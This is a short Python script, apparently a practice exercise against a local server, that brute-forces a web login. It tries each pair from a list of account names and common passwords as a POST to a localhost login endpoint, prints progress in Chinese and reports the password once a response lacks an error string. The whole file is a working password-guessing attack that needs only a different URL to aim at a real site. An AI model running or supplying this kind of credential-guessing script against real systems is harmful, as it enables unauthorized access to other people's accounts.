import requests
acc=["lcc0507","abcd", "abcdefgh", "password", "avalon", "123456",]
passwords=["lcc0507","abcd", "abcdefgh", "password", "1234", "123456",]
for ac in acc:
    for password in passwords:
        param={"userAccount":ac, "userPassword":password}
        page=requests.post("http://localhost:7000/login_process/", data=param)
        print(f"目前正在測試 {password}....")
        if "error" not in page.text:
            print(f"正確密碼: {password}")
            break